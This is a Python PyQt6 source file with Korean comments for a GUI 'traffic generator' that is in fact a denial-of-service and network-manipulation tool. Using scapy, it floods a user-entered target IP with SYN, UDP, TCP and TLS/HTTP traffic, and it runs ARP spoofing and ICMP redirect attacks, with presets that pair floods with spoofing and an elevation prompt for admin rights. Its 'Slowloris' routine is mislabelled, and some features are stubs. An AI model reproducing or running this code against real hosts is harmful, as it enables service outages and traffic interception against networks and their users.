# 필요한 모듈을 임포트.
from PyQt6.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QHBoxLayout, QCheckBox, QMessageBox, QComboBox
from PyQt6.QtGui import QIcon
from scapy.all import IP, TCP, UDP, send, ARP, ICMP
import threading
import socket
import random
from multiprocessing import Process, Value
import subprocess
import ctypes
import sys
import json
from PyQt6.QtCore import Qt

# SYN 플러드 공격을 수행하는 함수.
def syn_flood(target_ip, packet_count, packet_size, stop_flag):
    for _ in range(packet_count):
        if stop_flag.value:
            break
        port = random.randint(1, 65535)
        payload_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
        packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/('X'*payload_size)
        send(packet, inter=0.0001)
        subprocess.run(f'echo SYN packet sent to {target_ip}:{port}', shell=True)

# UDP 플러드 공격을 수행하는 함수.
def udp_flood(target_ip, packet_count, packet_size, stop_flag):
    for _ in range(packet_count):
        if stop_flag.value:
            break
        port = random.randint(1, 65535)
        payload_size = packet_size - 20 - 8 - 14  # IP header (20 bytes) + UDP header (8 bytes) + Ethernet header (14 bytes)
        packet = IP(dst=target_ip)/UDP(dport=port)/('X'*payload_size)
        send(packet, inter=0.0001)
        subprocess.run(f'echo UDP packet sent to {target_ip}:{port}', shell=True)

# HTTP Slowloris 공격을 수행하는 함수
def http_slowloris(target_ip, packet_count, packet_size, stop_flag):
    for _ in range(packet_count):
        if stop_flag.value:
            break
        payload_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
        packet = IP(dst=target_ip)/TCP(dport=80, flags='PA')/('X'*payload_size)
        send(packet, inter=0.0001)
        subprocess.run(f'echo HTTP Slowloris packet sent to {target_ip}:80', shell=True)

# TCP 핸드셰이크 오용 공격을 수행하는 함수.
def tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag):
    for _ in range(packet_count):
        if stop_flag.value:
            break
        port = random.randint(1, 65535)
        payload_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
        packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/('X'*payload_size)
        send(packet, inter=0.0001)
        subprocess.run(f'echo TCP handshake misuse packet sent to {target_ip}:{port}', shell=True)

# SSL/TLS 트래픽을 생성하는 함수.
def ssl_traffic(target_ip, count, packet_size, stop_flag):
    import ssl
    import socket
    for _ in range(count):
        if stop_flag.value:
            break
        context = ssl.create_default_context()
        with socket.create_connection((target_ip, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=target_ip) as ssock:
                data_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
                data = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n' + b'X' * data_size + b'\r\n\r\n'
                ssock.sendall(data)
                subprocess.run(f'echo SSL/TLS packet sent to {target_ip}:443', shell=True)

# HTTP 요청을 변조하는 함수.
def http_request_modification(target_ip, packet_count, packet_size, stop_flag):
    import requests
    for _ in range(packet_count):
        if stop_flag.value:
            break
        headers = {'User-Agent': 'ModifiedUserAgent'}
        try:
            requests.get(f'http://{target_ip}', headers=headers)
            subprocess.run(f'echo HTTP request sent to {target_ip}', shell=True)
        except requests.exceptions.RequestException:
            pass

# ARP 스푸핑 공격을 수행하는 함수.
def arp_spoof(target_ip, spoof_ip, stop_flag):
    while not stop_flag.value:
        # ARP 패킷 생성
        # 목적지 MAC 주소를 명시적으로 설정
        arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip, op='is-at')
        send(arp_response, verbose=False)
        subprocess.run(f'echo ARP spoofing packet sent to {target_ip}', shell=True)

# ICMP 리다이렉트 공격을 수행하는 함수.
def icmp_redirect(target_ip, new_gateway_ip, stop_flag):
    while not stop_flag.value:
        # ICMP 리다이렉트 패킷 생성
        icmp_redirect_packet = IP(dst=target_ip)/ICMP(type=5, code=1, gw=new_gateway_ip)
        send(icmp_redirect_packet, verbose=False)
        subprocess.run(f'echo ICMP redirect packet sent to {target_ip}', shell=True)

def standalone_syn_flood(target_ip, packet_count, packet_size, stop_flag):
    syn_flood(target_ip, packet_count, packet_size, stop_flag)


def standalone_udp_flood(target_ip, packet_count, packet_size, stop_flag):
    udp_flood(target_ip, packet_count, packet_size, stop_flag)


def standalone_http_slowloris(target_ip, packet_count, packet_size, stop_flag):
    http_slowloris(target_ip, packet_count, packet_size, stop_flag)


def standalone_tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag):
    tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag)


def standalone_ssl_traffic(target_ip, packet_count, packet_size, stop_flag):
    ssl_traffic(target_ip, packet_count, packet_size, stop_flag)


def standalone_http_request_modification(target_ip, packet_count, packet_size, stop_flag):
    http_request_modification(target_ip, packet_count, packet_size, stop_flag)


def standalone_arp_spoof(target_ip, spoof_ip, stop_flag):
    arp_spoof(target_ip, spoof_ip, stop_flag)


def standalone_icmp_redirect(target_ip, new_gateway_ip, stop_flag):
    icmp_redirect(target_ip, new_gateway_ip, stop_flag)

# 트래픽 생성기 애플리케이션 클래스.
class TrafficGeneratorApp(QWidget):
    def __init__(self, main_app, parent=None):
        super().__init__(parent)
        self.main_app = main_app  # MainApp 인스턴스를 저장
        self.setWindowTitle("트래픽 생성기")
        layout = QVBoxLayout()

        # 상단 레이아웃 설정
        top_layout = QHBoxLayout()

        # 뒤로가기 버튼을 설정.
        back_button = QPushButton("")
        back_button.setIcon(QIcon.fromTheme("go-previous"))  # 아이콘 설정
        back_button.setFixedSize(30, 30)  # 다른 어플리케이션과 동일한 크기
        back_button.clicked.connect(self.go_back)  # 뒤로가기 기능 연결
        top_layout.addWidget(back_button)

        # IP 입력 필드를 설정.
        ip_label = QLabel("대상 IP:")
        self.ip_input = QLineEdit()
        top_layout.addWidget(ip_label)
        top_layout.addWidget(self.ip_input)

        layout.addLayout(top_layout)

        # 기본 프리셋 추가
        self.presets = {
            "SYN 플러드 + ARP 스푸핑": {
                "syn_flood": True,
                "arp_spoofing": True
            },
            "SYN 플러드 + ICMP 리다이렉트": {
                "syn_flood": True,
                "icmp_redirect": True
            },
            "UDP 플러드 + ARP 스푸핑": {
                "udp_flood": True,
                "arp_spoofing": True
            },
            "HTTP Slowloris + ARP 스푸핑": {
                "http_slowloris": True,
                "arp_spoofing": True
            },
            "TCP 핸드셰이크 오용 + ARP 스푸핑": {
                "tcp_handshake_misuse": True,
                "arp_spoofing": True
            },
            "SSL/TLS 트래픽 생성 + 포트 미러링": {
                "ssl_traffic": True,
                "port_mirroring": True
            },
            "HTTP 요청 변조 + ARP 스푸핑": {
                "http_request_modification": True,
                "arp_spoofing": True
            }
        }

        # 패킷 크기 선택 체크박스 추가
        packet_size_layout = QHBoxLayout()
        self.default_packet_size_checkbox = QCheckBox("기본 패킷 크기 (1514 바이트)")
        self.large_packet_size_checkbox = QCheckBox("큰 패킷 크기 (단편화 증가)")
        self.default_packet_size_checkbox.setChecked(True)  # 기본 선택
        packet_size_layout.addWidget(self.default_packet_size_checkbox)
        packet_size_layout.addWidget(self.large_packet_size_checkbox)
        layout.addLayout(packet_size_layout)

        # 체크박스 상호 배타적 설정
        self.default_packet_size_checkbox.stateChanged.connect(lambda: self.toggle_packet_size())
        self.large_packet_size_checkbox.stateChanged.connect(lambda: self.toggle_packet_size())

        # 프리셋 선택 드롭다운 추가
        preset_layout = QHBoxLayout()
        self.preset_dropdown = QComboBox()
        self.preset_dropdown.addItems(self.presets.keys())
        self.preset_dropdown.currentIndexChanged.connect(self.apply_preset)
        preset_layout.addWidget(QLabel("기본 프리셋:"))
        preset_layout.addWidget(self.preset_dropdown)
        layout.addLayout(preset_layout)

        # 1번 선택군과 2번 선택군을 나란히 배치
        attack_group_layout = QHBoxLayout()

        # 1번 선택군 체크박스 설정 (트래픽 생성 관련 공격)
        group1_layout = QVBoxLayout()
        group1_label = QLabel("1번 선택군 (트래픽 생성):")
        group1_layout.addWidget(group1_label)
        self.syn_flood_checkbox = QCheckBox("SYN 플러드")
        self.udp_flood_checkbox = QCheckBox("UDP 플러드")
        self.http_slowloris_checkbox = QCheckBox("HTTP Slowloris")
        self.tcp_handshake_misuse_checkbox = QCheckBox("TCP 핸드셰이크 오용")
        self.ssl_traffic_checkbox = QCheckBox("SSL/TLS 트래픽")
        self.http_request_modification_checkbox = QCheckBox("HTTP 요청 변조")
        group1_layout.addWidget(self.syn_flood_checkbox)
        group1_layout.addWidget(self.udp_flood_checkbox)
        group1_layout.addWidget(self.http_slowloris_checkbox)
        group1_layout.addWidget(self.tcp_handshake_misuse_checkbox)
        group1_layout.addWidget(self.ssl_traffic_checkbox)
        group1_layout.addWidget(self.http_request_modification_checkbox)

        # 2번 선택군 체크박스 설정 (네트워크 조작 관련 공격)
        group2_layout = QVBoxLayout()
        group2_label = QLabel("2번 선택군 (네트워크 조작):")
        group2_layout.addWidget(group2_label)
        self.arp_spoofing_checkbox = QCheckBox("ARP 스푸핑")
        self.icmp_redirect_checkbox = QCheckBox("ICMP 리다이렉트")
        self.port_mirroring_checkbox = QCheckBox("포트 미러링")
        group2_layout.addWidget(self.arp_spoofing_checkbox)
        group2_layout.addWidget(self.icmp_redirect_checkbox)
        group2_layout.addWidget(self.port_mirroring_checkbox)

        # 각 그룹의 요소들을 정렬하여 깔끔하게 배치
        group1_layout.setAlignment(Qt.AlignmentFlag.AlignTop)
        group2_layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        attack_group_layout.addLayout(group1_layout)
        attack_group_layout.addLayout(group2_layout)
        layout.addLayout(attack_group_layout)

        # 패킷 수 입력 필드를 설정.
        packet_count_layout = QHBoxLayout()
        packet_count_label = QLabel("패킷 수:")
        self.packet_count_input = QLineEdit("10")
        packet_count_layout.addWidget(packet_count_label)
        packet_count_layout.addWidget(self.packet_count_input)
        layout.addLayout(packet_count_layout)

        # 패킷 생성 버튼을 설정.
        generate_button = QPushButton("패킷 생성 및 전송")
        generate_button.clicked.connect(self.generate_traffic)
        layout.addWidget(generate_button)

        # 전송 중단 버튼을 설정.
        stop_button = QPushButton("전송 중단")
        stop_button.clicked.connect(self.stop_transmission)
        layout.addWidget(stop_button)

        self.setLayout(layout)

        # 스레드 및 프로세스 추적을 위한 리스트를 초기화.
        self.processes = []
        self.stop_flag = Value('b', False)

    # 메인 화면으로 돌아가는 메서드.
    def go_back(self):
        # MainApp의 show_main_screen 메서드를 호출
        self.main_app.show_main_screen()

    def run_syn_flood(self, target_ip, packet_count):
        syn_flood(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_udp_flood(self, target_ip, packet_count):
        udp_flood(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_http_slowloris(self, target_ip, packet_count):
        http_slowloris(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_tcp_handshake_misuse(self, target_ip, packet_count):
        tcp_handshake_misuse(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_ssl_traffic(self, target_ip, packet_count):
        ssl_traffic(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_http_request_modification(self, target_ip, packet_count):
        http_request_modification(target_ip, packet_count, self.get_packet_size(), self.stop_flag)

    def run_arp_spoof(self, target_ip, spoof_ip):
        arp_spoof(target_ip, spoof_ip, self.stop_flag)

    def run_icmp_redirect(self, target_ip, new_gateway_ip):
        icmp_redirect(target_ip, new_gateway_ip, self.stop_flag)

    # 트래픽을 생성하고 전송하는 메서드.
    def generate_traffic(self):
        if not self.is_admin():
            QMessageBox.critical(self, "권한 오류", "관리자 권한이 필요합니다.")
            self.request_admin_privileges()
            return

        self.stop_flag.value = False  # 중단 플래그 초기화
        target_ip = self.ip_input.text().strip()
        packet_count = int(self.packet_count_input.text())
        packet_size = self.get_packet_size()  # 패킷 크기 가져오기
        if self.is_valid_ip(target_ip):
            QMessageBox.information(self, "트래픽 생성", "트래픽 생성이 시작됩니다.")
            self.cmd_process = subprocess.Popen("start cmd /k echo 트래픽 생성 중...", shell=True)

            attack_methods = []
            if self.syn_flood_checkbox.isChecked():
                attack_methods.append((standalone_syn_flood, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.udp_flood_checkbox.isChecked():
                attack_methods.append((standalone_udp_flood, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.http_slowloris_checkbox.isChecked():
                attack_methods.append((standalone_http_slowloris, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.tcp_handshake_misuse_checkbox.isChecked():
                attack_methods.append((standalone_tcp_handshake_misuse, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.ssl_traffic_checkbox.isChecked():
                attack_methods.append((standalone_ssl_traffic, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.http_request_modification_checkbox.isChecked():
                attack_methods.append((standalone_http_request_modification, (target_ip, packet_count, packet_size, self.stop_flag)))
            if self.arp_spoofing_checkbox.isChecked():
                # ARP 스푸핑을 위한 추가 입력 필요
                spoof_ip = "192.168.1.1"  # 예시 IP, 실제로는 사용자 입력 필요
                attack_methods.append((standalone_arp_spoof, (target_ip, spoof_ip, self.stop_flag)))
            if self.icmp_redirect_checkbox.isChecked():
                # ICMP 리다이렉트를 위한 추가 입력 필요
                new_gateway_ip = "192.168.1.254"  # 예시 IP, 실제로는 사용자 입력 필요
                attack_methods.append((standalone_icmp_redirect, (target_ip, new_gateway_ip, self.stop_flag)))

            for method, args in attack_methods:
                process = Process(target=method, args=args)
                process.start()
                self.processes.append(process)
            print(f"패킷이 {target_ip}로 전송되었습니다.")
        else:
            QMessageBox.warning(self, "잘못된 IP", "올바른 IP 주소를 입력하세요.")
            self.ip_input.clear()

    # IP 주소의 유효성을 검사하는 메서드.
    def is_valid_ip(self, ip):
        # IP 주소 유효성 검사 강화
        try:
            socket.inet_pton(socket.AF_INET, ip)
            return True
        except socket.error:
            return False

    # HTTP Slowloris 공격을 구현하는 메서드.
    def slowloris_attack(self, target_ip):
        # HTTP Slowloris 공격 구현
        pass

    # 트래픽 전송을 중단하는 메서드.
    def stop_transmission(self):
        self.stop_flag.value = True  # 중단 플래그 설정
        for process in self.processes:
            process.terminate()  # 프로세스 종료
        self.processes.clear()
        print("전송이 중단되었습니다.")
        if hasattr(self, 'cmd_process'):
            self.cmd_process.terminate()  # 명령 프롬프트 창 닫기
        # 트래픽 생성 중단 알림
        QMessageBox.information(self, "트래픽 중단", "트래픽 생성이 중단되었습니다.")

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def request_admin_privileges(self):
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except Exception as e:
            QMessageBox.critical(self, "권한 오류", f"관리자 권한 요청에 실패했습니다: {e}")

    def apply_preset(self):
        preset_name = self.preset_dropdown.currentText()
        preset = self.presets.get(preset_name, {})

        self.syn_flood_checkbox.setChecked(preset.get("syn_flood", False))
        self.udp_flood_checkbox.setChecked(preset.get("udp_flood", False))
        self.http_slowloris_checkbox.setChecked(preset.get("http_slowloris", False))
        self.tcp_handshake_misuse_checkbox.setChecked(preset.get("tcp_handshake_misuse", False))
        self.ssl_traffic_checkbox.setChecked(preset.get("ssl_traffic", False))
        self.http_request_modification_checkbox.setChecked(preset.get("http_request_modification", False))
        self.arp_spoofing_checkbox.setChecked(preset.get("arp_spoofing", False))
        self.icmp_redirect_checkbox.setChecked(preset.get("icmp_redirect", False))
        self.port_mirroring_checkbox.setChecked(preset.get("port_mirroring", False))

    def toggle_packet_size(self):
        sender = self.sender()
        if sender == self.default_packet_size_checkbox and self.default_packet_size_checkbox.isChecked():
            self.large_packet_size_checkbox.setChecked(False)
        elif sender == self.large_packet_size_checkbox and self.large_packet_size_checkbox.isChecked():
            self.default_packet_size_checkbox.setChecked(False)

    def get_packet_size(self):
        if self.default_packet_size_checkbox.isChecked():
            return 1514
        elif self.large_packet_size_checkbox.isChecked():
            return 9000  # 예시로 큰 패킷 크기 설정
        return 1514  # 기본값 